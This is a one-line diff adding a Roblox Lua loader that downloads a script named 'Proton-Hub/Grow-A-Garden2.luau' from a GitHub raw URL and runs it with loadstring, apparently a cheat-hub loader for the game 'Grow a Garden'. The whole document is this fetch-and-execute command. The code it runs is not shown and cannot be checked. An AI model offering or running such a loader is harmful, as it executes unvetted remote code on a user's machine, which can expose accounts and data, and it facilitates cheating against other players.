@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/toxicity-561/Proton-Hub/refs/heads/main/Grow-A-Garden2.luau"))()
